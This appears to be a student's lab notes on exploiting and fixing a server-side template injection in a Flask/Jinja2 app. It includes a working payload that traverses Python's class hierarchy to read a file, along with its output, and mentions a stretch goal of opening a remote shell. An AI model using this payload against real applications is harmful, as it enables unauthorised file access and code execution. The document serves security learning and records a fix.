  - I actually had to get help with this one(sorry if that wasn't allowed) but shout out to Luc.
  - Trying to figure this one out was kinda like reading a traceback. Each part retruned a tuple, object, or list that I could go deeper into.
  - **Output:** b'It works!\n' (idk how to remove the b)
    > `?param=./hack.txt&exploit={{config.items().__class__.__mro__[1].__subclasses__()[91].__subclasses__()[1](request[request.args.param],request[request.args.param|string]).get_data(request.args.param)}}`

- [x] Fix and prevent the exploit!
  > created a sanitizer to convert non-allowed characters into nothing. preventing all the stuff I just did.
- [ ] **Stretch:** Use magic methods to expose more info
- [ ] **Stretch:** Open a remote shell
